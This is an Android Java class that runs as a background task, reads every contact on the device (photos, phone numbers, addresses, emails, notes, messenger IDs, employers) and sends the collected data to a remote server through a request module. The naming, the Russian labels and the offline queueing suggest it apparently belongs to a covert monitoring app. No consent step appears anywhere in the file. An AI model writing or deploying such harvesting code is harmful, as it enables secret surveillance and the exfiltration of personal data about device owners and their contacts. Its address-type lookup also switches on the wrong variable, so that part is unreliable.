package com.inet.android.list;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import org.json.JSONException;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Im;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.util.Base64;

/**
 * ListContact class is designed to get the list of contact
 * 
 * @author johny homicide
 * 
 */
public class ContactsList extends AsyncTask<Context, Void, Void> {
	private Context mContext;

	private String LOG_TAG = ContactsList.class.getSimpleName().toString();
	private String complete;
	private int version;
	private int imType;
	private int type;

	public void readContacts() throws JSONException {
		Logging.doLog(LOG_TAG, "readContact", "readContact");
		ContentResolver cr = mContext.getContentResolver();
		Set<Map<String, Object>> listOfMapsForData = new HashSet<Map<String, Object>>();

		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS, mContext);

		String encodedImage = null;
		StringBuilder sAdress;

		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

		if (NetworkChangeReceiver.isOnline(mContext) != 0) {
			if (cur.getCount() > 0) {
				while (cur.moveToNext()) {
					complete = "0";
					Map<String, Object> setContact = new HashMap<String, Object>();
					Map<String, String> typePhone = new HashMap<String, String>();
					Map<String, String> info = new HashMap<String, String>();

					sAdress = new StringBuilder();
					String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
					long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
					String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
					Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
					InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, uri);
					if (input != null) {

						Bitmap pic = BitmapFactory.decodeStream(input);
						ByteArrayOutputStream bos = new ByteArrayOutputStream();
						pic.compress(Bitmap.CompressFormat.PNG, 100, bos);
						byte[] bitmapdata = bos.toByteArray();
						encodedImage = Base64.encodeToString(bitmapdata, Base64.DEFAULT);
						if (!encodedImage.equals(" "))
							setContact.put("photo", encodedImage);
					}
					// ----------------------------------------------------------------------------------------------------------------------------------
					// get the phone number
					// ---------------------------------------------------------------------

					if (Integer.parseInt(
							cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

						Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
								ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
						while (pCur.moveToNext()) {
							String mPhone = pCur
									.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							String phoneType = getTipe(
									pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
							typePhone.put(mPhone, phoneType);
						}
						pCur.close();
					}
					// ------------------------------------------
					// Get Postal Address
					// -------------------------------------------------
					String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] addrWhereParams = new String[] { id,
							ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };
					Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams,
							null);

					if (addrCur.getCount() != 0) {
						while (addrCur.moveToNext()) {
							String country = addrCur.getString(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
							if (country != null)
								sAdress.append(country);
							String state = addrCur.getString(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
							if (state != null)
								sAdress.append(state);

							String city = addrCur.getString(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
							if (city != null)
								sAdress.append(city);
							String street = addrCur.getString(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
							if (street != null)
								sAdress.append(street);

							String postalCode = addrCur.getString(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
							if (postalCode != null)
								sAdress.append(postalCode);

							int type = addrCur.getInt(
									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
							if (sAdress.length() != 0)
								info.put("адрес", "(" + getTipeAddress(type) + ") " + sAdress.toString());
						}
					}
					addrCur.close();
					// ------------------------------------------------------------------------------------------
					// get email and type
					// -----------------------------------------------------------------------------------------------------------------------------------------
					Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
							ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[] { id }, null);
					while (emailCur.moveToNext()) {
						// This would allow you get several email addresses
						// if the email addresses were stored in an array

						String sEmail = emailCur
								.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
						int type = emailCur
								.getInt(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
						String customLabel = emailCur
								.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
						CharSequence cCustomemailType = ContactsContract.CommonDataKinds.Email
								.getTypeLabel(mContext.getResources(), type, customLabel);
						if (sEmail != null)
							info.put(" e-mail" + "(" + cCustomemailType + "): ", sEmail);
					}
					emailCur.close();
					// ------------------------------------------
					// Get note
					// ------------------------------------------

					String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] noteWhereParams = new String[] { id,
							ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE };

					Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams,
							null);
					if (noteCur.moveToFirst()) {
						String note = noteCur
								.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
						if (note != null) {
							if (!note.equals(""))
								info.put("заметка", note);
						}
					}
					noteCur.close();

					// ----------------------------------------------------------------------------------------------------------------------------------------------------
					// Get Instant Messenger
					// ------------------------------------------

					String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] imWhereParams = new String[] { id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
					Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
					if (imCur != null) {
						if (imCur.moveToFirst()) {
							for (int i = 0; i < imCur.getCount(); i++) {

								String imName = imCur
										.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
								String imType;
								imType = getTipeIm(imCur
										.getInt(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL)));
								info.put(imType, imName);
								imCur.moveToNext();
							}

						}
						imCur.close();
					}

					// ----------------------------------------------------------------------------------------------------------------------------------------------------
					// Get Organizations
					// ------------------------------------------

					String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] orgWhereParams = new String[] { id,
							ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
					Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
					if (orgCur.moveToFirst()) {
						String orgName = orgCur
								.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
						String title = orgCur
								.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));

						if (orgName != null) {
							if (title == null)
								info.put("организация", orgName);
							else
								info.put("организация", orgName + " " + title);
						}
					}
					orgCur.close();

					if (name != null) {
						if (!name.equals(""))
							setContact.put("name", name);
					}
					if (!typePhone.isEmpty())
						setContact.put("number", typePhone);
					if (!info.isEmpty())
						setContact.put("info", info);
					listOfMapsForData.add(setContact);

				}
				if (listOfMapsForData.isEmpty() != true) {
					sendRequest(listOfMapsForData);
					listOfMapsForData = null;
				} else
					sendRequest("");

				Logging.doLog(LOG_TAG, "cur.close()", "cur.close()");
				cur.close();
			} else {
				Logging.doLog(LOG_TAG, "contactCursor == null", "contactCursor == null");
				sendRequest("");
			}

		} else {
			Logging.doLog(LOG_TAG, "else connect", "else connect");
			Queue.setList(AppConstants.TYPE_LIST_CONTACTS, version, "0", mContext);
		}
	}

	private void sendRequest(Object request) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 .." + version);

		RequestList.sendDemandRequest(request, AppConstants.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
	}

	private String getTipe(int phonetype) {
		int phoneType = phonetype;
		switch (phoneType) {
		case 1:
			return "Home";
		case 2:
			return "Mobile";
		case 3:
			return "Work";
		case 4:
			return "Home Fax";
		case 5:
			return "Work Fax";
		case 6:
			return "Main";
		case 7:
			return "Other";
		case 8:
			return "Custom";
		case 9:
			return "Pager";
		}
		return "unknown";
	}

	private String getTipeIm(int imType) {
		this.imType = imType;
		switch (imType) {
		case Im.PROTOCOL_GOOGLE_TALK:
			return "GTALK";
		case Im.PROTOCOL_AIM:
			return "AIM";
		case Im.PROTOCOL_MSN:
			return "MSN";
		case Im.PROTOCOL_YAHOO:
			return "YAHOO";
		case Im.PROTOCOL_ICQ:
			return "ICQ";
		case Im.PROTOCOL_JABBER:
			return "JABBER";
		case Im.PROTOCOL_SKYPE:
			return "SKYPE";
		case Im.PROTOCOL_QQ:
			return "QQ";
		}
		return null;
	}

	private String getTipeAddress(int type) {
		this.type = type;
		switch (imType) {
		case StructuredPostal.TYPE_WORK:
			return "Work";
		case StructuredPostal.TYPE_HOME:
			return "Home";
		case StructuredPostal.TYPE_OTHER:
			return "Other";
		case StructuredPostal.TYPE_CUSTOM:
			return "Custom";
		}
		return null;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Auto-generated method stub
		this.mContext = params[0];
		Logging.doLog(LOG_TAG, "doIn");
		try {
			readContacts();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
